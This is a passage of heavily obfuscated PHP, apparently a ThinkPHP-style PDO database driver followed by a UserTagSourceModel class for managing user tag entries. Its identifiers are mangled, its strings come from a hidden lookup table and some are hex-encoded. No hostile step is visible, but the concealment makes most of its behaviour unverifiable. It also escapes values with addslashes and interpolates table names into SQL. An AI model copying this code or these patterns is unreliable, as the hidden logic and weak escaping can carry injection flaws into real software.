$€ĞªöÒÆ =& $_SERVER[ĞÂ¤àÓï]; if (!class_exists($€ĞªöÒÆ[914])) { think_exception(think_lang($€ĞªöÒÆ[14]) . $€ĞªöÒÆ[915]); } if (!empty($ÅÍöÜ•)) { $this->config = $ÅÍöÜ•; if (empty($this->config[$€ĞªöÒÆ[17]])) { $this->config[$€ĞªöÒÆ[17]] = array(); } } } public function connect($šÀÚºØ• = '', $…³ĞÃÂ = 0) { $„ªÔÈ‰‘ =& $_SERVER[ĞÂ¤àÓï]; if (!isset($this->linkID[$…³ĞÃÂ])) { if (empty($šÀÚºØ•)) { $šÀÚºØ• = $this->config; } $Õ¯¡¢æ½ = !empty($šÀÚºØ•[$„ªÔÈ‰‘[17]][$„ªÔÈ‰‘[18]]) ? $šÀÚºØ•[$„ªÔÈ‰‘[17]][$„ªÔÈ‰‘[18]] : $this->pconnect; if ($Õ¯¡¢æ½) { $šÀÚºØ•[$„ªÔÈ‰‘[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$…³ĞÃÂ] = new PDO($šÀÚºØ•[$„ªÔÈ‰‘[916]], $šÀÚºØ•[$„ªÔÈ‰‘[888]], $šÀÚºØ•[$„ªÔÈ‰‘[889]], $šÀÚºØ•[$„ªÔÈ‰‘[17]]); } catch (PDOException $ø°¹é³ù) { think_exception($ø°¹é³ù->getMessage()); } $this->dbType = $this->_getDsnType($šÀÚºØ•[$„ªÔÈ‰‘[916]]); if (in_array($this->dbType, array($„ªÔÈ‰‘[917], $„ªÔÈ‰‘[918], $„ªÔÈ‰‘[919], $„ªÔÈ‰‘[920]))) { think_exception($„ªÔÈ‰‘[921] . $this->dbType . $„ªÔÈ‰‘[922] . $this->dbType . $„ªÔÈ‰‘[923]); } if (!$this->linkID[$…³ĞÃÂ]) { think_exception($„ªÔÈ‰‘[924]); } try { $this->linkID[$…³ĞÃÂ]->exec($„ªÔÈ‰‘[925] . think_config($„ªÔÈ‰‘[891])); } catch (Exception $ø°¹é³ù) { } $this->connected = !0; if (1 != think_config($„ªÔÈ‰‘[22])) { unset($this->config); } } return $this->linkID[$…³ĞÃÂ]; } public function free() { $this->PDOStatement = null; } public function query($®Ú‘üÓ, $Á€Êáœ· = array()) { $×¿½Øëµ =& $_SERVER[ĞÂ¤àÓï]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $®Ú‘üÓ; if (!empty($Á€Êáœ·)) { $this->queryStr .= $×¿½Øëµ[926] . print_r($Á€Êáœ·, !0) . $×¿½Øëµ[927]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($×¿½Øëµ[23], 1); think_status($×¿½Øëµ[24]); $this->PDOStatement = $this->_linkID->prepare($®Ú‘üÓ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $¾¹£±Ûµ = $this->PDOStatement->execute($Á€Êáœ·); $this->debug(); if (!1 === $¾¹£±Ûµ) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($«ıÏ¤Êš, $§™İ”­¢ = array()) { $°’îúÅ† =& $_SERVER[ĞÂ¤àÓï]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $«ıÏ¤Êš; if (!empty($§™İ”­¢)) { $this->queryStr .= $°’îúÅ†[926] . print_r($§™İ”­¢, !0) . $°’îúÅ†[927]; } $ğ‰Æ­–­ = !1; if ($this->dbType == $°’îúÅ†[920]) { if (preg_match($°’îúÅ†[928], $this->queryStr, $õê÷òØ·)) { $this->table = think_config($°’îúÅ†[929]) . str_ireplace(think_config($°’îúÅ†[930]), $°’îúÅ†[378], $õê÷òØ·[2]); $ğ‰Æ­–­ = (bool) $this->query($°’îúÅ†[931] . strtoupper($this->table) . $°’îúÅ†[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($°’îúÅ†[25], 1); think_status($°’îúÅ†[24]); $this->PDOStatement = $this->_linkID->prepare($«ıÏ¤Êš); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $€àÒüÔà = $this->PDOStatement->execute($§™İ”­¢); $this->debug(); if (!1 === $€àÒüÔà) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($ğ‰Æ­–­ || preg_match($°’îúÅ†[932], $«ıÏ¤Êš)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $—ŠÒ†éç = $this->_linkID->commit(); $this->transTimes = 0; if (!$—ŠÒ†éç) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $–ø¾Èù« = $this->_linkID->rollback(); $this->transTimes = 0; if (!$–ø¾Èù«) { $this->error(); return !1; } } return !0; } private function getAll() { $£™¨°§„ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($£™¨°§„); return $£™¨°§„; } public function getFields($å¬ò£¿) { $Ñ´³ÁÑ› =& $_SERVER[ĞÂ¤àÓï]; $this->initConnect(!0); if (think_config($Ñ´³ÁÑ›[933])) { $Èáş×ûÃ = str_replace($Ñ´³ÁÑ›[934], $å¬ò£¿, think_config($Ñ´³ÁÑ›[933])); } else { switch ($this->dbType) { case $Ñ´³ÁÑ›[917]: case $Ñ´³ÁÑ›[935]: $Èáş×ûÃ = "\123\105\x4c\105\x43\x54\40\40\x20\x63\x6f\x6c\x75\155\156\137\x6e\141\155\x65\40\x61\x73\x20\x27\x4e\x61\x6d\145\47\x2c\40\x20\x20\x64\141\x74\x61\x5f\164\171\160\145\40\x61\163\40\47\x54\x79\x70\145\x27\54\x20\40\x20\x63\157\x6c\x75\155\x6e\x5f\x64\x65\x66\141\x75\x6c\164\x20\x61\163\40\x27\x44\x65\x66\141\x75\x6c\x74\47\54\x20\40\x20\151\163\137\156\x75\154\x6c\x61\142\154\145\40\141\163\40\x27\x4e\x75\154\x6c\x27\12\x9\x9\106\x52\117\115\x9\151\x6e\x66\157\162\x6d\x61\164\151\157\x6e\137\163\x63\x68\x65\155\x61\56\164\x61\x62\154\x65\163\40\101\123\40\x74\xa\11\11\x4a\x4f\111\x4e\x9\151\x6e\146\157\162\x6d\x61\x74\151\x6f\156\137\163\143\x68\x65\x6d\141\56\x63\157\x6c\x75\x6d\x6e\163\40\101\123\40\x63\xa\x9\x9\117\116\x20\x20\x74\x2e\164\141\x62\x6c\x65\137\143\141\164\141\154\157\147\x20\75\x20\143\x2e\164\141\x62\154\145\x5f\x63\x61\164\x61\x6c\x6f\x67\xa\11\x9\101\x4e\x44\x20\x74\56\x74\141\142\154\145\x5f\x73\143\150\145\x6d\141\40\x3d\x20\x63\x2e\x74\x61\x62\x6c\145\137\163\143\x68\x65\155\141\12\x9\x9\101\116\x44\x20\x74\56\164\x61\142\154\x65\x5f\x6e\141\x6d\145\x20\x3d\x20\143\x2e\164\141\142\x6c\x65\137\x6e\x61\x6d\x65\12\x9\x9\127\x48\x45\x52\x45\x20\40\x20\x74\56\164\x61\142\154\145\137\x6e\x61\155\x65\x20\75\x20\x27{$å¬ò£¿}\47"; break; case $Ñ´³ÁÑ›[936]: $Èáş×ûÃ = $Ñ´³ÁÑ›[937] . $å¬ò£¿ . $Ñ´³ÁÑ›[938]; break; case $Ñ´³ÁÑ›[918]: case $Ñ´³ÁÑ›[920]: $Èáş×ûÃ = $Ñ´³ÁÑ›[939] . $Ñ´³ÁÑ›[940] . $Ñ´³ÁÑ›[941] . strtoupper($å¬ò£¿) . $Ñ´³ÁÑ›[942] . strtoupper($å¬ò£¿) . $Ñ´³ÁÑ›[943]; break; case $Ñ´³ÁÑ›[944]: $Èáş×ûÃ = $Ñ´³ÁÑ›[945] . $å¬ò£¿ . $Ñ´³ÁÑ›[946]; break; case $Ñ´³ÁÑ›[919]: break; case $Ñ´³ÁÑ›[947]: default: $Èáş×ûÃ = $Ñ´³ÁÑ›[948] . ($this->dbType == $Ñ´³ÁÑ›[947] ? "\x60{$å¬ò£¿}\x60" : $å¬ò£¿); } } $·’¦Äö… = $this->query($Èáş×ûÃ); $İÑŸ¡Ûİ = array(); if ($·’¦Äö…) { foreach ($·’¦Äö… as $¿¼¶Ò±Õ => $÷›â¥Æø) { $÷›â¥Æø = array_change_key_case($÷›â¥Æø); $÷›â¥Æø[$Ñ´³ÁÑ›[32]] = isset($÷›â¥Æø[$Ñ´³ÁÑ›[32]]) ? $÷›â¥Æø[$Ñ´³ÁÑ›[32]] : $Ñ´³ÁÑ›[378]; $÷›â¥Æø[$Ñ´³ÁÑ›[33]] = isset($÷›â¥Æø[$Ñ´³ÁÑ›[33]]) ? $÷›â¥Æø[$Ñ´³ÁÑ›[33]] : $Ñ´³ÁÑ›[378]; $Î§å¢Ø = isset($÷›â¥Æø[$Ñ´³ÁÑ›[273]]) ? $÷›â¥Æø[$Ñ´³ÁÑ›[273]] : $÷›â¥Æø[$Ñ´³ÁÑ›[32]]; $İÑŸ¡Ûİ[$Î§å¢Ø] = array($Ñ´³ÁÑ›[32] => $Î§å¢Ø, $Ñ´³ÁÑ›[33] => $÷›â¥Æø[$Ñ´³ÁÑ›[33]], $Ñ´³ÁÑ›[35] => (bool) (isset($÷›â¥Æø[$Ñ´³ÁÑ›[103]]) && $÷›â¥Æø[$Ñ´³ÁÑ›[103]] === $Ñ´³ÁÑ›[12] || isset($÷›â¥Æø[$Ñ´³ÁÑ›[35]]) && $÷›â¥Æø[$Ñ´³ÁÑ›[35]] === $Ñ´³ÁÑ›[12]), $Ñ´³ÁÑ›[37] => isset($÷›â¥Æø[$Ñ´³ÁÑ›[37]]) ? $÷›â¥Æø[$Ñ´³ÁÑ›[37]] : (isset($÷›â¥Æø[$Ñ´³ÁÑ›[56]]) ? $÷›â¥Æø[$Ñ´³ÁÑ›[56]] : $Ñ´³ÁÑ›[378]), $Ñ´³ÁÑ›[39] => isset($÷›â¥Æø[$Ñ´³ÁÑ›[94]]) ? strtolower($÷›â¥Æø[$Ñ´³ÁÑ›[94]]) == $Ñ´³ÁÑ›[41] : (isset($÷›â¥Æø[$Ñ´³ÁÑ›[57]]) ? $÷›â¥Æø[$Ñ´³ÁÑ›[57]] : !1), $Ñ´³ÁÑ›[42] => isset($÷›â¥Æø[$Ñ´³ÁÑ›[949]]) ? strtolower($÷›â¥Æø[$Ñ´³ÁÑ›[949]]) == $Ñ´³ÁÑ›[44] : (isset($÷›â¥Æø[$Ñ´³ÁÑ›[94]]) ? $÷›â¥Æø[$Ñ´³ÁÑ›[94]] : !1)); } } return $İÑŸ¡Ûİ; } public function getTables($Òò¤¶à = '') { $œ›ÈÄğ =& $_SERVER[ĞÂ¤àÓï]; if (think_config($œ›ÈÄğ[950])) { $ù…èåã¡ = str_replace($œ›ÈÄğ[951], $Òò¤¶à, think_config($œ›ÈÄğ[950])); } else { switch ($this->dbType) { case $œ›ÈÄğ[918]: case $œ›ÈÄğ[920]: $ù…èåã¡ = $œ›ÈÄğ[952]; break; case $œ›ÈÄğ[917]: case $œ›ÈÄğ[935]: $ù…èåã¡ = $œ›ÈÄğ[953]; break; case $œ›ÈÄğ[944]: $ù…èåã¡ = $œ›ÈÄğ[954]; break; case $œ›ÈÄğ[919]: think_exception(think_lang($œ›ÈÄğ[955]) . $œ›ÈÄğ[956]); break; case $œ›ÈÄğ[936]: $ù…èåã¡ = $œ›ÈÄğ[45] . $œ›ÈÄğ[46] . $œ›ÈÄğ[47]; break; case $œ›ÈÄğ[947]: default: if (!empty($Òò¤¶à)) { $ù…èåã¡ = $œ›ÈÄğ[899] . $Òò¤¶à . $œ›ÈÄğ[900]; } else { $ù…èåã¡ = $œ›ÈÄğ[901]; } } } $ëõäÇÔÓ = $this->query($ù…èåã¡); $Ôø¹òôë = array(); foreach ($ëõäÇÔÓ as $ê½Šİ¿ú => $”Ó×ÄÕ±) { $Ôø¹òôë[$ê½Šİ¿ú] = current($”Ó×ÄÕ±); } return $Ôø¹òôë; } protected function parseLimit($ŠÒµ¯²ç) { $îæË¿Î´ =& $_SERVER[ĞÂ¤àÓï]; $µœ’ø“¦ = $îæË¿Î´[12]; if (!empty($ŠÒµ¯²ç)) { switch ($this->dbType) { case $îæË¿Î´[944]: case $îæË¿Î´[936]: $ŠÒµ¯²ç = explode($îæË¿Î´[50], $ŠÒµ¯²ç); if (count($ŠÒµ¯²ç) > 1) { $µœ’ø“¦ .= $îæË¿Î´[51] . $ŠÒµ¯²ç[1] . $îæË¿Î´[52] . $ŠÒµ¯²ç[0] . $îæË¿Î´[53]; } else { $µœ’ø“¦ .= $îæË¿Î´[51] . $ŠÒµ¯²ç[0] . $îæË¿Î´[53]; } break; case $îæË¿Î´[917]: case $îæË¿Î´[935]: break; case $îæË¿Î´[919]: break; case $îæË¿Î´[918]: case $îæË¿Î´[920]: break; case $îæË¿Î´[947]: default: $µœ’ø“¦ .= $îæË¿Î´[51] . $ŠÒµ¯²ç . $îæË¿Î´[53]; } } return $µœ’ø“¦; } public function parseKey(&$­ô¹÷¢Ï, $Ò¥åëÚ = true) { $»Ú×•ç =& $_SERVER[ĞÂ¤àÓï]; if ($Ò¥åëÚ) { $­ô¹÷¢Ï = $this->parseKeyCheck($­ô¹÷¢Ï); } if ($this->dbType == $»Ú×•ç[947]) { if ($­ô¹÷¢Ï != $»Ú×•ç[188] && !preg_match($»Ú×•ç[911], $­ô¹÷¢Ï)) { $­ô¹÷¢Ï = $»Ú×•ç[385] . trim($­ô¹÷¢Ï, $»Ú×•ç[385]) . $»Ú×•ç[385]; } return $­ô¹÷¢Ï; } else { return parent::parseKey($­ô¹÷¢Ï, $Ò¥åëÚ); } } public function close() { $this->_linkID = null; } public function error() { $øàë›†Ş =& $_SERVER[ĞÂ¤àÓï]; if ($this->PDOStatement) { $ë¾ƒ›à÷ = $this->PDOStatement->errorInfo(); $this->error = $ë¾ƒ›à÷[1] . $øàë›†Ş[4] . $ë¾ƒ›à÷[2]; } else { $this->error = $øàë›†Ş[12]; } if ($øàë›†Ş[12] != $this->queryStr) { $this->error .= LNG($øàë›†Ş[48]) . $this->queryStr; } think_trace($this->error, $øàë›†Ş[12], $øàë›†Ş[49]); return $this->error; } public function escapeString($®˜¤Éñ) { $¸“‹™ş„ =& $_SERVER[ĞÂ¤àÓï]; switch ($this->dbType) { case $¸“‹™ş„[944]: case $¸“‹™ş„[917]: case $¸“‹™ş„[935]: case $¸“‹™ş„[947]: return addslashes($®˜¤Éñ); case $¸“‹™ş„[919]: case $¸“‹™ş„[936]: case $¸“‹™ş„[918]: case $¸“‹™ş„[920]: return str_ireplace($¸“‹™ş„[58], $¸“‹™ş„[59], $®˜¤Éñ); } } protected function parseValue($½üàîı) { $ÇÏ¨€¬Û =& $_SERVER[ĞÂ¤àÓï]; if (is_string($½üàîı)) { $ñ‰•¦• = strpos($½üàîı, $ÇÏ¨€¬Û[4]) === 0 && in_array($½üàîı, array_keys($this->bind)); $½üàîı = $ñ‰•¦• ? $this->escapeString($½üàîı) : $ÇÏ¨€¬Û[957] . $this->escapeString($½üàîı) . $ÇÏ¨€¬Û[957]; } elseif (isset($½üàîı[0]) && is_string($½üàîı[0]) && strtolower($½üàîı[0]) == $ÇÏ¨€¬Û[297]) { $½üàîı = $this->escapeString($½üàîı[1]); } elseif (is_array($½üàîı)) { $½üàîı = array_map(array($this, $ÇÏ¨€¬Û[958]), $½üàîı); } elseif (is_bool($½üàîı)) { $½üàîı = $½üàîı ? $ÇÏ¨€¬Û[88] : $ÇÏ¨€¬Û[197]; } elseif (is_null($½üàîı)) { $½üàîı = $ÇÏ¨€¬Û[103]; } return $½üàîı; } public function getLastInsertId() { $¿­ìæˆ£ =& $_SERVER[ĞÂ¤àÓï]; switch ($this->dbType) { case $¿­ìæˆ£[944]: case $¿­ìæˆ£[936]: case $¿­ìæˆ£[917]: case $¿­ìæˆ£[935]: case $¿­ìæˆ£[919]: case $¿­ìæˆ£[947]: return $this->_linkID->lastInsertId(); case $¿­ìæˆ£[918]: case $¿­ìæˆ£[920]: $÷ĞÅÄ£ = $this->table; $èÖÆŠÙù = $this->query("\x53\105\x4c\105\103\124\40{$÷ĞÅÄ£}\x2e\x63\165\162\x72\166\x61\x6c\x20\143\165\162\x72\x76\x61\x6c\x20\106\122\x4f\115\40\144\165\141\x6c"); return $èÖÆŠÙù ? $èÖÆŠÙù[0][$¿­ìæˆ£[959]] : 0; } } } $_file = $_SERVER[$_SERVER[ĞÂ¤àÓï][775]]; $_size = $_SERVER[ĞÂ¤àÓï][776]; goto bä‚ğ„ÚÑá; aÄì˜‹ä‹•: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\145\162\x5f\146\x61\166"; protected function cacheFunctionAlias($ş¨ò³€ø) { $½û¯°È =& $_SERVER[ĞÂ¤àÓï]; return array($½û¯°È[1965] => array($½û¯°È[2344] . USER_ID, $½û¯°È[1966])); } protected function listData() { $Ä›İû¤ =& $_SERVER[ĞÂ¤àÓï]; $¬ı‹ìü = array($Ä›İû¤[1655] => USER_ID, $Ä›İû¤[484] => array($Ä›İû¤[1969], 0)); $ì¢çÒÔ€ = $Ä›İû¤[2345]; $ü†±ÚÎñ = $this->field($ì¢çÒÔ€)->where($¬ı‹ìü)->order($Ä›İû¤[1972])->select(); return $ü†±ÚÎñ ? $ü†±ÚÎñ : array(); } protected function addToTag($û®¿ÉÅ, $Ô…øõ·®) { $Ÿ…¦í™¾ =& $_SERVER[ĞÂ¤àÓï]; if (!Model($Ÿ…¦í™¾[2109])->listData($Ô…øõ·®)) { return !1; } if (is_numeric($û®¿ÉÅ)) { $çÙû‘Ìº = Model($Ÿ…¦í™¾[832])->pathInfo($û®¿ÉÅ); if (!$çÙû‘Ìº) { return !1; } } else { $çÙû‘Ìº = IO::infoSimple($û®¿ÉÅ); if (!$çÙû‘Ìº) { return !1; } $‚ı¶²Ìõ = $çÙû‘Ìº[$Ÿ…¦í™¾[32]]; $…˜ÀıÁã = $çÙû‘Ìº[$Ÿ…¦í™¾[33]]; if (isset($çÙû‘Ìº[$Ÿ…¦í™¾[410]])) { $…˜ÀıÁã = $çÙû‘Ìº[$Ÿ…¦í™¾[410]] == $Ÿ…¦í™¾[88] ? $Ÿ…¦í™¾[75] : $Ÿ…¦í™¾[199]; } } $å»Åï÷Í = array($Ÿ…¦í™¾[1655] => USER_ID, $Ÿ…¦í™¾[484] => $Ô…øõ·®, $Ÿ…¦í™¾[421] => $û®¿ÉÅ, $Ÿ…¦í™¾[422] => $…˜ÀıÁã ? $…˜ÀıÁã : $Ÿ…¦í™¾[416], $Ÿ…¦í™¾[420] => $‚ı¶²Ìõ ? $‚ı¶²Ìõ : $Ÿ…¦í™¾[12], $Ÿ…¦í™¾[1858] => 0); if ($this->where($å»Åï÷Í)->find()) { return !1; } return $this->add($å»Åï÷Í); } protected function removeFromTag($œî¡’, $Íí‰şÁê) { $¿«í…µ  =& $_SERVER[ĞÂ¤àÓï]; if (!Model($¿«í…µ [2109])->listData($Íí‰şÁê)) { return !1; } if (is_array($œî¡’)) { $œî¡’ = array($¿«í…µ [7], $œî¡’); } $’®ó³ÒÉ = array($¿«í…µ [1655] => USER_ID, $¿«í…µ [484] => $Íí‰şÁê, $¿«í…µ [421] => $œî¡’); return $this->where($’®ó³ÒÉ)->delete(); } protected function removeByTag($Üß¡òş) { $§ñïÜ‹¾ =& $_SERVER[ĞÂ¤àÓï]; if (!$Üß¡òş) { return !1; } $§Ä²€Û = array($§ñïÜ‹¾[1655] => USER_ID, $§ñïÜ‹¾[484] => $Üß¡òş); return $this->where($§Ä²€Û)->delete(); } protected function removeBySource($èÓÕ¥ºÎ) { $Ñî™—æş =& $_SERVER[ĞÂ¤àÓï]; if (is_array($èÓÕ¥ºÎ)) { $èÓÕ¥ºÎ = array($Ñî™—æş[7], $èÓÕ¥ºÎ); } $ÀµÔ¬şè = array($Ñî™—æş[1655] => USER_ID, $Ñî™—æş[484] => array($Ñî™—æş[1014], 0), $Ñî™—æş[421] => $èÓÕ¥ºÎ); return $this->where($ÀµÔ¬şè)->delete(); } }